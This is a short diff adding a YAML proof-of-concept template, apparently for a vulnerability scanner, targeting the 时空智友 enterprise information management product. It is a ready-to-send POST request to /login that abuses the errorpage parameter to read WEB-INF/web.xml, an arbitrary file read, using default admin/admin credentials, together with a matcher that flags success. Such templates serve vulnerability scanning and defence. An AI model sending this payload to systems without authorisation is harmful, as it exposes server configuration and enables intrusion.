@@ -1,0 +1,12 @@
+name: poc-yaml-时空智友企业信息管理-Diretory
+description: "读取任意文件"
+method: POST
+body: "op=verify%7Clogin&targetpage=&errorpage=WEB-INF/web.xml&mark=&tzo=480&username=admin&password=admin"
+headers:
+  Content-Type: "application/x-www-form-urlencoded"
+path:
+  - /login
+expression:
+  status: 200
+  body_all:
+    - "index.html"
